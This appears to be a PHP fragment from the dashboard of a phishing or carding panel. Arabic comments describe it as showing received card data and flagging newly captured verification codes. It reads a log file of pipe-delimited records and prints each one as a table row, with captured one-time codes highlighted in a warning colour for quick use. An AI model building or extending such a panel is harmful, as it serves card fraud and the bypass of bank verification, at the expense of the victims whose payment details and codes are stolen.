<?php
$file_path = "data_secure_log.txt";

if (file_exists($file_path) && filesize($file_path) > 0) {
    $file_lines = file($file_path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $file_lines = array_reverse($file_lines); 

    foreach ($file_lines as $line) {
        $data = explode("|||", $line);
        if (count($data) == 5) {
            // إذا كان السطر عبارة عن رمز تحقق، قم بتلوينه بلون تنبيهي خاص (أصفر أو برتقالي)
            if (strpos($data[0], '--- رمز تحقق جديد ---') !== false) {
                echo "<tr style='background-color: #fff3cd; font-weight: bold;'>";
                echo "<td colspan='2' style='color: #856404;'>🔑 " . htmlspecialchars($data[1]) . "</td>";
                echo "<td>---</td>";
                echo "<td>---</td>";
                echo "<td>" . htmlspecialchars($data[4]) . "</td>";
                echo "</tr>";
            } else {
                // عرض بيانات البطاقة الطبيعية
                echo "<tr>";
                echo "<td><span class='badge'>" . htmlspecialchars($data[0]) . "</span></td>";
                echo "<td class='ltr-text'>" . htmlspecialchars($data[1]) . "</td>";
                echo "<td class='ltr-text'>" . htmlspecialchars($data[2]) . "</td>";
                echo "<td><code>" . htmlspecialchars($data[3]) . "</code></td>";
                echo "<td>" . htmlspecialchars($data[4]) . "</td>";
                echo "</tr>";
            }
        }
    }
} else {
    echo "<tr><td colspan='5'>لا توجد عمليات مستلمة حتى الآن.</td></tr>";
}
?>








